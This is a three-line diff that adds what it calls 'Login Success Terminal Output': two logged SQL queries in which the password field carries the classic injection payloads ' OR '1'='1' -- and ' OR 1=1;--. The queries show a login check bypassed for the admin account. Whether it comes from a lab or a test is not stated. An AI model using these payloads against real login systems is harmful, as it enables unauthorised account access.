@@ -1,0 +1,3 @@
+Login Success Terminal Output
+EXECUTED QUERY: SELECT * FROM users WHERE username = 'admin' AND password_hash = '' OR '1'='1' --';
+EXECUTED QUERY: SELECT * FROM users WHERE username = 'admin' AND password_hash = '' OR 1=1;--';
